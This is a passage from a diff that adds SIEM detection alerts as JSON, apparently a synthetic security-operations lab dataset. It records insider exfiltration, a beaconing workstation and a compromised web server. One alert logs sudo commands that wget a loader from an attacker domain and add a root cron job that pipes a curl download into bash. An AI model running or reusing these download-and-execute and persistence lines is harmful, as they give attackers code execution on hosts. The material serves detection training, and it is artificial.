+    "group_key": "j.patel",
+    "first_event_ts": "2026-10-24T02:10:00Z",
+    "last_event_ts": "2026-10-24T02:10:00Z",
+    "detected_at": "2026-10-24T02:10:00Z",
+    "event_count": 3,
+    "event_ids": [
+      "EVT-000933",
+      "EVT-000934",
+      "EVT-000935"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000933",
+        "ts": "2026-10-24T02:10:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon from finance workstation"
+      },
+      {
+        "event_id": "EVT-000934",
+        "ts": "2026-10-24T02:10:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon from finance workstation"
+      },
+      {
+        "event_id": "EVT-000935",
+        "ts": "2026-10-24T02:10:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon from finance workstation"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.14"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "db01.corp.local",
+        "dc01.corp.local",
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Off-hours access to sensitive file share: 3 matching event(s) for user.name=j.patel between 2026-10-24T02:10:00Z and 2026-10-24T02:10:00Z",
+    "alert_id": "ALT-2026-0024",
+    "risk_score": 55,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-034",
+    "rule_name": "Off-hours access to sensitive file share",
+    "description": "Interactive or network logon to a Confidential/Restricted file server outside business hours.",
+    "type": "match",
+    "base_severity": "Medium",
+    "confidence": 0.7,
+    "incident_type": "Insider Threat",
+    "playbook": "PB-INSIDER",
+    "mitre": [
+      {
+        "id": "T1039",
+        "tactic": "Collection",
+        "technique": "Data from Network Shared Drive"
+      },
+      {
+        "id": "T1078",
+        "tactic": "Defense Evasion",
+        "technique": "Valid Accounts"
+      }
+    ],
+    "entity": {
+      "user.name": "m.singh"
+    },
+    "group_key": "m.singh",
+    "first_event_ts": "2026-10-25T00:52:00Z",
+    "last_event_ts": "2026-10-25T00:52:00Z",
+    "detected_at": "2026-10-25T00:52:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-001068"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001068",
+        "ts": "2026-10-25T00:52:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon to HR share"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.7"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "m.singh"
+      ],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Off-hours access to sensitive file share: 1 matching event(s) for user.name=m.singh between 2026-10-25T00:52:00Z and 2026-10-25T00:52:00Z",
+    "alert_id": "ALT-2026-0032",
+    "risk_score": 48,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 3,
+      "asset": "ws-hr-07.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-hr-07.corp.local",
+      "ip": "10.10.2.7",
+      "role": "HR Workstation",
+      "criticality": "Medium",
+      "business_unit": "HR",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-035",
+    "rule_name": "New local account created on server",
+    "description": "A local user account was created on a Linux server, a common persistence technique after compromise.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.85,
+    "incident_type": "Persistence",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1136.001",
+        "tactic": "Persistence",
+        "technique": "Create Account: Local Account"
+      }
+    ],
+    "entity": {
+      "host.name": "web-srv-02.corp.local"
+    },
+    "group_key": "web-srv-02.corp.local",
+    "first_event_ts": "2026-10-22T03:18:02Z",
+    "last_event_ts": "2026-10-22T03:18:02Z",
+    "detected_at": "2026-10-22T03:18:02Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000726"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000726",
+        "ts": "2026-10-22T03:18:02Z",
+        "action": "account_created",
+        "message": "new user: name=svcmon, UID=1002, GID=1002, home=/home/svcmon, shell=/bin/bash"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "svcmon"
+      ],
+      "hosts": [
+        "web-srv-02.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "New local account created on server: 1 matching event(s) for host.name=web-srv-02.corp.local between 2026-10-22T03:18:02Z and 2026-10-22T03:18:02Z",
+    "alert_id": "ALT-2026-0010",
+    "risk_score": 76,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 6,
+      "asset": "web-srv-02.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "web-srv-02.corp.local",
+      "ip": "10.10.0.40",
+      "role": "Web / Reverse Proxy",
+      "criticality": "High",
+      "business_unit": "Engineering",
+      "environment": "production",
+      "data_classification": "Public"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-036",
+    "rule_name": "Suspicious download or execution via sudo",
+    "description": "A privileged command downloads remote content, pipes it to a shell, or writes a cron job referencing external infrastructure.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.8,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1105",
+        "tactic": "Command and Control",
+        "technique": "Ingress Tool Transfer"
+      }
+    ],
+    "entity": {
+      "host.name": "web-srv-02.corp.local"
+    },
+    "group_key": "web-srv-02.corp.local",
+    "first_event_ts": "2026-10-22T03:16:00Z",
+    "last_event_ts": "2026-10-22T03:21:00Z",
+    "detected_at": "2026-10-22T03:21:00Z",
+    "event_count": 2,
+    "event_ids": [
+      "EVT-000723",
+      "EVT-000729"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000723",
+        "ts": "2026-10-22T03:16:00Z",
+        "action": "sudo_command",
+        "message": "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://cdn-update-sync.com/ldr.sh -O /tmp/.x"
+      },
+      {
+        "event_id": "EVT-000729",
+        "ts": "2026-10-22T03:21:00Z",
+        "action": "sudo_command",
+        "message": "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'echo \"*/10 * * * * root /usr/bin/curl -s http://cdn-update-sync.com/beacon | /bin/bash\" >> /etc/cron.d/sysmon'"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "deploy"
+      ],
+      "hosts": [
+        "web-srv-02.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Suspicious download or execution via sudo: 2 matching event(s) for host.name=web-srv-02.corp.local between 2026-10-22T03:16:00Z and 2026-10-22T03:21:00Z",
+    "alert_id": "ALT-2026-0011",
+    "risk_score": 76,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 6,
+      "asset": "web-srv-02.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "web-srv-02.corp.local",
+      "ip": "10.10.0.40",
+      "role": "Web / Reverse Proxy",
+      "criticality": "High",
+      "business_unit": "Engineering",
+      "environment": "production",
+      "data_classification": "Public"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-037",
+    "rule_name": "Bulk data upload to external destination",
+    "description": "A single outbound HTTP session transfers more than 500 MB to an external host.",
+    "type": "threshold",
+    "base_severity": "High",
+    "confidence": 0.75,
+    "incident_type": "Data Breach",
+    "playbook": "PB-DATA-BREACH",
+    "mitre": [
+      {
+        "id": "T1041",
+        "tactic": "Exfiltration",
+        "technique": "Exfiltration Over C2 Channel"
+      }
+    ],
+    "entity": {
+      "source.ip": "10.10.2.7"
+    },
+    "group_key": "10.10.2.7",
+    "first_event_ts": "2026-10-25T00:45:00Z",
+    "last_event_ts": "2026-10-25T01:15:00Z",
+    "detected_at": "2026-10-25T01:15:00Z",
+    "event_count": 3,
+    "event_ids": [
+      "EVT-001067",
+      "EVT-001070",
+      "EVT-001074"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001067",
+        "ts": "2026-10-25T00:45:00Z",
+        "action": "http_request",
+        "message": "POST https://data-share-cloud.net/upload -> 200"
+      },
+      {
+        "event_id": "EVT-001070",
+        "ts": "2026-10-25T01:00:00Z",
+        "action": "http_request",
+        "message": "POST https://data-share-cloud.net/upload -> 200"
+      },
+      {
+        "event_id": "EVT-001074",
+        "ts": "2026-10-25T01:15:00Z",
+        "action": "http_request",
+        "message": "POST https://data-share-cloud.net/upload -> 200"
+      }
+    ],
+    "intel": [
+      {
+        "type": "domain",
+        "value": "data-share-cloud.net",
+        "threat_type": "Data Exfiltration",
+        "confidence": "high",
+        "source": "MISP",
+        "first_seen": "2026-10-09",
+        "last_seen": "2026-10-26",
+        "tags": "exfil,file-sharing",
+        "description": "Look-alike file sharing portal used to stage stolen data"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.7"
+      ],
+      "destination_ips": [],
+      "domains": [
+        "data-share-cloud.net"
+      ],
+      "users": [
+        "m.singh"
+      ],
+      "hosts": [
+        "ws-hr-07.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": 6606028800.0,
+    "threshold": 500000000.0,
+    "summary": "Bulk data upload to external destination: 3 matching event(s) for source.ip=10.10.2.7 between 2026-10-25T00:45:00Z and 2026-10-25T01:15:00Z",
+    "alert_id": "ALT-2026-0034",
+    "risk_score": 85,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "ws-hr-07.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-hr-07.corp.local",
+      "ip": "10.10.2.7",
+      "role": "HR Workstation",
+      "criticality": "Medium",
+      "business_unit": "HR",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-038",
+    "rule_name": "Upload to known exfiltration destination",
+    "description": "Outbound transfer to an IP or domain listed in threat intelligence as a data exfiltration destination.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Data Breach",
+    "playbook": "PB-DATA-BREACH",
+    "mitre": [
+      {
+        "id": "T1567",
+        "tactic": "Exfiltration",
+        "technique": "Exfiltration Over Web Service"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-hr-07.corp.local"
+    },
+    "group_key": "ws-hr-07.corp.local",
+    "first_event_ts": "2026-10-25T00:45:00Z",
+    "last_event_ts": "2026-10-25T01:15:00Z",
+    "detected_at": "2026-10-25T01:15:00Z",
+    "event_count": 3,
+    "event_ids": [
+      "EVT-001067",
+      "EVT-001070",
+      "EVT-001074"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001067",
+        "ts": "2026-10-25T00:45:00Z",
+        "action": "http_request",
+        "message": "POST https://data-share-cloud.net/upload -> 200"
+      },
+      {
+        "event_id": "EVT-001070",
+        "ts": "2026-10-25T01:00:00Z",
+        "action": "http_request",
+        "message": "POST https://data-share-cloud.net/upload -> 200"
+      },
+      {
+        "event_id": "EVT-001074",
+        "ts": "2026-10-25T01:15:00Z",
+        "action": "http_request",
+        "message": "POST https://data-share-cloud.net/upload -> 200"
+      }
+    ],
+    "intel": [
+      {
+        "type": "domain",
+        "value": "data-share-cloud.net",
+        "threat_type": "Data Exfiltration",
+        "confidence": "high",
+        "source": "MISP",
+        "first_seen": "2026-10-09",
+        "last_seen": "2026-10-26",
+        "tags": "exfil,file-sharing",
+        "description": "Look-alike file sharing portal used to stage stolen data"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.7"
+      ],
+      "destination_ips": [],
+      "domains": [
+        "data-share-cloud.net"
+      ],
+      "users": [
+        "m.singh"
+      ],
+      "hosts": [
+        "ws-hr-07.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Upload to known exfiltration destination: 3 matching event(s) for host.name=ws-hr-07.corp.local between 2026-10-25T00:45:00Z and 2026-10-25T01:15:00Z",
+    "alert_id": "ALT-2026-0035",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 3,
+      "asset": "ws-hr-07.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-hr-07.corp.local",
+      "ip": "10.10.2.7",
+      "role": "HR Workstation",
+      "criticality": "Medium",
+      "business_unit": "HR",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-039",
+    "rule_name": "Audit log cleared",
+    "description": "The Windows security audit log was cleared, an anti-forensic action that frequently follows privilege escalation.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Defense Evasion",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1070.001",
+        "tactic": "Defense Evasion",
+        "technique": "Indicator Removal: Clear Windows Event Logs"
+      }
+    ],
+    "entity": {
+      "host.name": "fs01.corp.local"
+    },
+    "group_key": "fs01.corp.local",
+    "first_event_ts": "2026-10-24T02:40:00Z",
+    "last_event_ts": "2026-10-24T02:40:00Z",
+    "detected_at": "2026-10-24T02:40:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-001060"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001060",
+        "ts": "2026-10-24T02:40:00Z",
+        "action": "audit_log_cleared",
+        "message": "The audit log was cleared"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Audit log cleared: 1 matching event(s) for host.name=fs01.corp.local between 2026-10-24T02:40:00Z and 2026-10-24T02:40:00Z",
+    "alert_id": "ALT-2026-0030",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "fs01.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "fs01.corp.local",
+      "ip": "10.10.0.20",
+      "role": "File Server",
+      "criticality": "Critical",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-040",
+    "rule_name": "Proxy denial burst",
+    "description": "Fifty or more denied web requests from one internal client within ten minutes, indicating beaconing or DNS tunnelling attempts.",
+    "type": "threshold",
+    "base_severity": "Medium",
+    "confidence": 0.7,
+    "incident_type": "Malware",
+    "playbook": "PB-C2",
+    "mitre": [
+      {
+        "id": "T1071.001",
+        "tactic": "Command and Control",
+        "technique": "Application Layer Protocol: Web Protocols"
+      }
+    ],
+    "entity": {
+      "source.ip": "10.10.2.14"
+    },
+    "group_key": "10.10.2.14",
+    "first_event_ts": "2026-10-23T09:44:00Z",
+    "last_event_ts": "2026-10-23T09:51:21Z",
+    "detected_at": "2026-10-23T09:51:21Z",
+    "event_count": 50,
+    "event_ids": [
+      "EVT-000832",
+      "EVT-000833",
+      "EVT-000834",
+      "EVT-000835",
+      "EVT-000836",
+      "EVT-000837",
+      "EVT-000838",
+      "EVT-000839",
+      "EVT-000840",
+      "EVT-000841",
+      "EVT-000842",
+      "EVT-000843",
+      "EVT-000844",
+      "EVT-000845",
+      "EVT-000846",
+      "EVT-000847",
+      "EVT-000848",
+      "EVT-000849",
+      "EVT-000850",
+      "EVT-000851",
+      "EVT-000852",
+      "EVT-000853",
+      "EVT-000854",
+      "EVT-000855",
+      "EVT-000856",
+      "EVT-000857",
+      "EVT-000858",
+      "EVT-000859",
+      "EVT-000860",
+      "EVT-000861",
+      "EVT-000862",
+      "EVT-000863",
+      "EVT-000864",
+      "EVT-000865",
+      "EVT-000866",
+      "EVT-000867",
+      "EVT-000868",
+      "EVT-000869",
+      "EVT-000870",
+      "EVT-000871",
+      "EVT-000872",
+      "EVT-000873",
+      "EVT-000874",
+      "EVT-000875",
+      "EVT-000876",
+      "EVT-000877",
+      "EVT-000878",
+      "EVT-000879",
+      "EVT-000880",
+      "EVT-000881"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000832",
+        "ts": "2026-10-23T09:44:00Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000833",
+        "ts": "2026-10-23T09:44:09Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000834",
+        "ts": "2026-10-23T09:44:18Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000835",
+        "ts": "2026-10-23T09:44:27Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000836",
+        "ts": "2026-10-23T09:44:36Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000837",
+        "ts": "2026-10-23T09:44:45Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000838",
+        "ts": "2026-10-23T09:44:54Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000839",
+        "ts": "2026-10-23T09:45:03Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000840",
+        "ts": "2026-10-23T09:45:12Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000841",
+        "ts": "2026-10-23T09:45:21Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000842",
+        "ts": "2026-10-23T09:45:30Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000843",
+        "ts": "2026-10-23T09:45:39Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000844",
+        "ts": "2026-10-23T09:45:48Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000845",
+        "ts": "2026-10-23T09:45:57Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000846",
+        "ts": "2026-10-23T09:46:06Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000847",
+        "ts": "2026-10-23T09:46:15Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000848",
+        "ts": "2026-10-23T09:46:24Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000849",
+        "ts": "2026-10-23T09:46:33Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000850",
+        "ts": "2026-10-23T09:46:42Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000851",
+        "ts": "2026-10-23T09:46:51Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000852",
+        "ts": "2026-10-23T09:47:00Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000853",
+        "ts": "2026-10-23T09:47:09Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000854",
+        "ts": "2026-10-23T09:47:18Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000855",
+        "ts": "2026-10-23T09:47:27Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000856",
+        "ts": "2026-10-23T09:47:36Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000857",
+        "ts": "2026-10-23T09:47:45Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000858",
+        "ts": "2026-10-23T09:47:54Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000859",
+        "ts": "2026-10-23T09:48:03Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000860",
+        "ts": "2026-10-23T09:48:12Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000861",
+        "ts": "2026-10-23T09:48:21Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000862",
+        "ts": "2026-10-23T09:48:30Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000863",
+        "ts": "2026-10-23T09:48:39Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000864",
+        "ts": "2026-10-23T09:48:48Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000865",
+        "ts": "2026-10-23T09:48:57Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000866",
+        "ts": "2026-10-23T09:49:06Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000867",
+        "ts": "2026-10-23T09:49:15Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000868",
+        "ts": "2026-10-23T09:49:24Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000869",
+        "ts": "2026-10-23T09:49:33Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000870",
+        "ts": "2026-10-23T09:49:42Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000871",
+        "ts": "2026-10-23T09:49:51Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      }
+    ],
+    "intel": [
+      {
+        "type": "domain",
+        "value": "cdn-update-sync.com",
+        "threat_type": "Malware",
+        "confidence": "high",
+        "source": "URLhaus",
+        "first_seen": "2026-10-11",
+        "last_seen": "2026-10-26",
+        "tags": "loader,payload",
+        "description": "Fake CDN used by a PowerShell downloader to stage second-stage payloads"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.14"
+      ],
+      "destination_ips": [],
+      "domains": [
+        "cdn-update-sync.com"
+      ],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Proxy denial burst: 50 matching event(s) for source.ip=10.10.2.14 between 2026-10-23T09:44:00Z and 2026-10-23T09:51:21Z",
+    "alert_id": "ALT-2026-0020",
+    "risk_score": 72,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 5,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "ANO-001",
+    "rule_name": "Outbound data volume anomaly",
+    "description": "Hourly outbound bytes for a host deviate more than five robust standard deviations from that host's seven day baseline.",
+    "type": "anomaly",
+    "feature": "outbound_bytes_per_host_hour",
+    "method": "robust_zscore",
+    "base_severity": "High",
+    "confidence": 0.6,
+    "incident_type": "Data Breach",
+    "playbook": "PB-DATA-BREACH",
+    "mitre": [
+      {
+        "id": "T1041",
+        "tactic": "Exfiltration",
+        "technique": "Exfiltration Over C2 Channel"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-hr-07.corp.local"
+    },
+    "group_key": "ws-hr-07.corp.local",
+    "first_event_ts": "2026-10-25T00:45:00Z",
+    "last_event_ts": "2026-10-25T00:45:00Z",
+    "detected_at": "2026-10-25T00:45:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-001066"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001066",
+        "ts": "2026-10-25T00:45:00Z",
+        "action": "firewall_allow",
+        "message": "allow tcp 10.10.2.7->203.0.113.199:443 rule=lan-to-wan-web"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.199",
+        "threat_type": "Denial of Service",
+        "confidence": "medium",
+        "source": "Anomali",
+        "first_seen": "2026-10-18",
+        "last_seen": "2026-10-25",
+        "tags": "ddos,http-flood",
+        "description": "Source of volumetric HTTP floods against retail portals"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "summary": "Outbound volume anomaly on ws-hr-07.corp.local: 4.1 GB in 2026-10-25T00:00 versus median 311.3 KB (robust z=26141.6)",
+    "false_positive_notes": "",
+    "observables": {
+      "source_ips": [
+        "10.10.2.7"
+      ],
+      "destination_ips": [
+        "203.0.113.199"
+      ],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "ws-hr-07.corp.local"
+      ],
+      "files": []
+    },
+    "observed_value": 4404019200.0,
+    "observed_human": "4.1 GB",
+    "baseline_median": 318792.0,
+    "baseline_sigma": 168455.98,
+    "baseline_basis": "host",
+    "anomaly_score": 26141.55,
+    "bucket": "2026-10-25T00",
+    "risk_score": 75,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "ws-hr-07.corp.local",
+      "threat_intel": 6,
+      "volume_corroboration": 4,
+      "confidence_penalty": -8
+    },
+    "asset": {
+      "hostname": "ws-hr-07.corp.local",
+      "ip": "10.10.2.7",
+      "role": "HR Workstation",
+      "criticality": "Medium",
+      "business_unit": "HR",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true,
+    "alert_id": "ALT-2026-0031"
+  },
+  {
+    "rule_id": "ANO-001",
+    "rule_name": "Outbound data volume anomaly",
+    "description": "Hourly outbound bytes for a host deviate more than five robust standard deviations from that host's seven day baseline.",
+    "type": "anomaly",
+    "feature": "outbound_bytes_per_host_hour",
+    "method": "robust_zscore",
+    "base_severity": "High",
+    "confidence": 0.6,
+    "incident_type": "Data Breach",
+    "playbook": "PB-DATA-BREACH",
+    "mitre": [
+      {
+        "id": "T1041",
+        "tactic": "Exfiltration",
+        "technique": "Exfiltration Over C2 Channel"
+      }
+    ],
+    "entity": {
